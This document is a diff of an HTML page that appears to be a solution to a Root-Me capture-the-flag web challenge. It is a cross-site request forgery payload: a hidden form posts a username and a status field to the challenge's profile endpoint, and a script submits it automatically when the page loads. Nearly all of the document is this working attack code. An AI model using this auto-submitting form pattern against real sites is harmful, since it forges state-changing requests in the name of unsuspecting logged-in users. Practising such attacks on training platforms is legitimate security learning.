@@ -1,12 +1,12 @@
 <html>
 <head>
   </head>
-<body onload='document.CSRF.submit()'>
+<body >
 
-<form action='http://challenge01.root-me.org/web-client/ch22/?action=profile' enctype=”multipart/form-data” method='POST' name='CSRF'>
+<form action='http://challenge01.root-me.org/web-client/ch22/?action=profile' enctype='multipart/form-data' method='POST' name='CSRF'>
 <input type='hidden' name='username' value='123'>
-<input type='hidden' name='status' value='ok'>
+<input type='hidden' name='status' value='on'>
 </form>
+<script>document.CSRF.submit()</script>
 </body>
-
 </html>
